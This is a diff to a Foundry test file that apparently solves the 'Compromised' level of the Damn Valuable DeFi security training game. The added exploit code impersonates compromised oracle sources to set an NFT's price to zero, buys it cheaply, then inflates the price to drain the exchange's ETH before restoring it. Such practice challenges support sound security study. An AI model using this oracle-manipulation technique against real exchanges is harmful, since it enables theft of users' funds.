@@ -7,6 +7,7 @@ import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
 import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
+import "forge-std/console.sol";
 
 contract Compromised is Test {
     uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
@@ -76,25 +77,60 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        address[] memory sources = new address[](3);
 
-        /**
-         * EXPLOIT END *
-         */
+        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
+        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
+        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
+        console.log(unicode"The attackers address is:", attacker);
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT", 0);
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+        vm.prank(sources[0]);
+        uint256 balanceHaked = address(exchange).balance;
+        trustfulOracle.postPrice("DVNFT", balanceHaked);
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT", balanceHaked);
+
+        vm.prank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        vm.prank(attacker);
+        exchange.sellOne(tokenId);
+
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
     function validation() internal {
         // Exchange must have lost all ETH
+        console.log(unicode"The balanc of exchange should be 0");
         assertEq(address(exchange).balance, 0);
 
         // Attacker's ETH balance must have significantly increased
+        console.log(
+            unicode"The balance of the attacker should be greater than the initial balance of the exchange which were %s",
+            EXCHANGE_INITIAL_ETH_BALANCE
+        );
+
         assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
 
         // Attacker must not own any NFT
+        console.log(unicode"The attacker should not own any NFT");
         assertEq(damnValuableNFT.balanceOf(attacker), 0);
 
         // NFT price shouldn't have changed
+        console.log(unicode"The price of the NFT should not have changed");
         assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
 }
